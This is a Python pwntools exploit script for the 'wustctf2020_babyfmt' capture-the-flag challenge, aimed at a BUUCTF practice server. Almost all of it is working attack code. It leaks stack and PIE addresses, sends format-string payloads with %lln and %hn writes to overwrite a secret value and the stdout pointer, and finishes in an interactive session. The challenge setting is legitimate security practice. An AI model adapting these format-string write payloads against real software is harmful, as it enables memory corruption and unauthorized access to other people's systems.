# -*- encoding: utf-8 -*-
import sys 
import os 
from pwn import * 
context.log_level = 'debug' 
context.update( os = 'linux', arch = 'amd64',timeout = 1)
binary = './wustctf2020_babyfmt'
elf = ELF(binary)
libc = elf.libc
context.binary = binary
DEBUG = 0
if DEBUG:
    p = process(binary)
    #p = process(['qemu-aarch64','-L','',binary])
    #p = process(['qemu-aarch64','-L','',-g,'1234',binary])
else:
    host = 'node4.buuoj.cn'
    port = '25358'
    p = remote(host,port)
l64 = lambda            : u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
l32 = lambda            : u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00'))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': 0x%x' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda a          : int( p.recv(len(str(a)))[2:] , 16)
def dbg():
    gdb.attach(p)
    pause()

def cmd(num):
    sla('>>',num)

sla("time:","a")
ru("ok! time is ")


stack_addr = int(p.recv(len("140731860922896")))
ru(":")
pie_addr = int(p.recv(len("94355533667285"))) - 0xbd5
elf.address = pie_addr
secret = elf.sym["secret"]
stderr = elf.sym["stderr"]
stdout = elf.sym["stdout"]

lg("secret",secret)
lg("stderr",stderr)
lg("stdout",stdout)


for i in range(0,8):
    cmd(2)
    payload = "%7$lln" + "%10$lln" + "aaa" + p64(secret + 8*i)
    sl(payload)     

#修改secret并修改标志位

cmd(1)
se(p64(stderr + 1))

data = rl()
leak_num = (ord(p.recv(1))<<8) + 0x40
#leak_num = (ord('\xe5')<<8) + 0x40
lg("leak_num",leak_num)

payload = ("%7$lln%"+ str(leak_num)+ "c%12$hn").ljust(0x18,"a") + p64(secret) + p64(stdout)

cmd(2)
sl(payload)

sleep(3)
#sla("exit","3")
cmd(3)
sa("open the door!","\x00"*0x40)


p.interactive()

'''
@File    :   wustctf2020_babyfmt.py
@Time    :   2021/07/15 22:48:00
@Author  :   Niyah 
'''